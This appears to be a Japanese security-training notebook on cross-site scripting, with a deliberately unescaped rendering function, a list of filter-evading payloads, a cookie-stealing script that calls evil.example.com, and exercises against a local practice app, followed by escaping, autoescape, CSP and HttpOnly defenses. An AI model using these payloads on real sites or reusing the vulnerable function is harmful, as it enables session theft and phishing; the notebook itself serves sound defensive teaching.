# Notebook 04: XSS（クロスサイトスクリプティング）

XSS は SQL インジェクションと並ぶ Web セキュリティの代表的な脆弱性です。
攻撃者がユーザーのブラウザ上でスクリプトを実行させることで、
Cookie の窃取やフィッシングなどの被害を引き起こします。

## 学習目標
1. XSS の 3 つの種類を理解する
2. 実際に labs/ のアプリで攻撃を体験する
3. エスケープ処理による防御方法を実装する

---

**この知識は labs/vulnerable_app の練習環境のみで使ってください**

## 1. XSS とは

Web ページにユーザーの入力がそのまま HTML として埋め込まれると、
攻撃者は `<script>` タグなどを注入して任意の JavaScript を実行できます。

### 例: 掲示板のコメント欄

```
正常な投稿:
  名前: 太郎
  コメント: こんにちは！
  → HTML: <b>太郎</b>: こんにちは！

攻撃的な投稿:
  名前: 太郎
  コメント: <script>alert('XSS!')</script>
  → HTML: <b>太郎</b>: <script>alert('XSS!')</script>
  → ブラウザがスクリプトを実行してしまう！
```

### XSS でできること
- Cookie（セッション ID）の窃取 → なりすまし
- 偽のログインフォームを表示 → フィッシング
- ページ内容の書き換え → 偽情報の表示
- キーロガーの設置 → パスワード窃取

## 2. XSS の 3 つの種類

### Stored XSS（格納型）
攻撃コードがサーバーに保存され、他のユーザーがページを開くたびに実行される。
- 例: 掲示板、コメント欄、プロフィール
- 被害範囲: 大（全ユーザーに影響）

### Reflected XSS（反射型）
攻撃コードが URL のパラメータに含まれ、サーバーがそのまま返す。
- 例: 検索結果ページの `?q=<script>...`
- 被害範囲: リンクをクリックした人のみ

### DOM-based XSS
サーバーを経由せず、JavaScript がクライアント側で DOM を操作する際に発生。
- 例: `document.innerHTML = location.hash`
- 被害範囲: リンクをクリックした人のみ

In [ ]:
# XSS のシミュレーション（Python でHTMLの埋め込みを再現）

def render_comment_vulnerable(name: str, comment: str) -> str:
    """脆弱なコメント表示（エスケープなし）"""
    return f"<div class='comment'><b>{name}</b>: {comment}</div>"

# 正常な入力
print("=== 正常な入力 ===")
html = render_comment_vulnerable("太郎", "こんにちは！")
print(f"生成HTML: {html}")
print()

# 攻撃的な入力
print("=== 攻撃入力: scriptタグ ===")
html = render_comment_vulnerable("攻撃者", "<script>alert('XSS!')</script>")
print(f"生成HTML: {html}")
print("→ ブラウザはこのscriptタグを実行してしまう")
print()

# Cookie窃取の攻撃例
print("=== 攻撃入力: Cookie窃取 ===")
html = render_comment_vulnerable(
    "攻撃者",
    "<script>new Image().src='http://evil.example.com/steal?c='+document.cookie</script>"
)
print(f"生成HTML: {html}")
print("→ 他のユーザーがこのページを開くとCookieが攻撃者のサーバーに送信される")

In [ ]:
# 様々な XSS ペイロード（攻撃パターン）
# セキュリティテストでよく使われるパターンを知っておこう

payloads = [
    # 基本パターン
    '<script>alert(1)</script>',
    # imgタグのonerror
    '<img src=x onerror=alert(1)>',
    # SVGタグ
    '<svg onload=alert(1)>',
    # イベントハンドラ
    '<body onload=alert(1)>',
    # scriptタグの大文字・小文字混在（フィルター回避）
    '<ScRiPt>alert(1)</sCrIpT>',
    # JavaScriptプロトコル
    '<a href="javascript:alert(1)">click</a>',
]

print("=== よく使われる XSS ペイロード ===")
for i, payload in enumerate(payloads, 1):
    html = render_comment_vulnerable("テスト", payload)
    print(f"\n{i}. ペイロード: {payload}")
    print(f"   生成HTML: {html}")

## 3. labs/ アプリで XSS を体験しよう

```bash
cd labs/vulnerable_app
pip install flask
python app.py
```

ブラウザで `http://localhost:5000/lab/xss/comment` を開く

### 試してみよう

**Step 1: 基本的な XSS**
```
コメント欄に入力: <script>alert('XSS!')</script>
→ アラートが表示されたら成功
```

**Step 2: Cookie の確認**
```
コメント欄に入力: <script>alert(document.cookie)</script>
→ セッション Cookie の値が表示される
```

**Step 3: ページの書き換え**
```
コメント欄に入力: <script>document.body.innerHTML='<h1>ハッキングされました</h1>'</script>
→ ページ全体が書き換わる
```

**Step 4: script タグを使わない攻撃**
```
コメント欄に入力: <img src=x onerror=alert('XSS')>
→ script タグをフィルタリングしても防げない攻撃パターン
```

## 4. 防御方法: HTML エスケープ

XSS を防ぐ基本は **HTML エスケープ** です。
特殊文字を HTML エンティティに変換して、ブラウザが HTML タグとして解釈しないようにします。

| 文字 | エスケープ後 |
|------|------------|
| `<`  | `&lt;`     |
| `>`  | `&gt;`     |
| `&`  | `&amp;`    |
| `"`  | `&quot;`   |
| `'`  | `&#39;`    |

In [ ]:
import html

def render_comment_safe(name: str, comment: str) -> str:
    """安全なコメント表示（HTMLエスケープ付き）"""
    safe_name = html.escape(name)
    safe_comment = html.escape(comment)
    return f"<div class='comment'><b>{safe_name}</b>: {safe_comment}</div>"

print("=== 脆弱なバージョン ===")
attack = "<script>alert('XSS!')</script>"
print(f"入力: {attack}")
print(f"出力: {render_comment_vulnerable('攻撃者', attack)}")
print("→ scriptタグがそのまま出力される")
print()

print("=== 安全なバージョン ===")
print(f"入力: {attack}")
print(f"出力: {render_comment_safe('攻撃者', attack)}")
print("→ <script> が &lt;script&gt; に変換され、ブラウザはテキストとして表示する")
print()

# 全てのペイロードを安全にレンダリング
print("=== 全ペイロードの安全なレンダリング ===")
test_payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
]
for p in test_payloads:
    print(f"入力: {p}")
    print(f"出力: {render_comment_safe('test', p)}")
    print()

In [ ]:
# フレームワークの自動エスケープ

# Jinja2 (Flask) の自動エスケープ
from jinja2 import Environment, BaseLoader

# autoescape=True がデフォルトのFlaskでは有効
env_safe = Environment(loader=BaseLoader(), autoescape=True)
env_unsafe = Environment(loader=BaseLoader(), autoescape=False)

template_str = "コメント: {{ comment }}"
attack_input = "<script>alert('XSS')</script>"

print("=== autoescape=True（安全） ===")
tmpl = env_safe.from_string(template_str)
print(tmpl.render(comment=attack_input))
print()

print("=== autoescape=False（危険） ===")
tmpl = env_unsafe.from_string(template_str)
print(tmpl.render(comment=attack_input))
print()

print("=== |safe フィルターの危険性 ===")
# |safe を使うとエスケープが無効化される
tmpl = env_safe.from_string("コメント: {{ comment|safe }}")
print(tmpl.render(comment=attack_input))
print("→ |safe を使うとエスケープが無効化される。信頼できないデータには絶対使わない！")

## 5. その他の防御策

### Content Security Policy (CSP)
HTTP ヘッダーでスクリプトの実行元を制限できます。

```
Content-Security-Policy: script-src 'self'
```
→ 自サイトのスクリプトのみ実行許可。インラインスクリプトはブロックされる。

### HttpOnly Cookie
```python
# Cookie に HttpOnly を設定すると JavaScript からアクセスできなくなる
response.set_cookie('session_id', value, httponly=True)
```
→ `document.cookie` で読めなくなるため、Cookie 窃取が困難になる。

### 入力バリデーション
- 許可する文字を限定（ホワイトリスト方式）
- HTML タグを全て除去（サニタイズ）

### 多層防御
```
入力バリデーション → HTML エスケープ → CSP → HttpOnly Cookie
                    ↑ 最も重要
```
複数の防御を組み合わせることで、一つが突破されても他でカバーできます。

## まとめ

| | 脆弱なコード | 安全なコード |
|-|------------|------------|
| HTML出力 | ユーザー入力をそのまま | `html.escape()` でエスケープ |
| テンプレート | `autoescape=False` / `|safe` | `autoescape=True`（デフォルト） |
| Cookie | 通常の Cookie | `httponly=True` |
| HTTP ヘッダー | なし | CSP ヘッダーを設定 |

**SQL インジェクションと同じく「ユーザーの入力を信頼しない」が原則です。**

## 演習

1. labs/vulnerable_app の Lab 3 で `<img src=x onerror=alert(document.cookie)>` を試してみよう
2. `render_comment_safe()` に名前欄のバリデーション（10文字以下）を追加してみよう
3. CSP ヘッダーを設定して、`<script>alert(1)</script>` がブロックされることを確認してみよう
4. Reflected XSS の攻撃 URL を作成してみよう（例: `http://localhost:5000/search?q=<script>...`）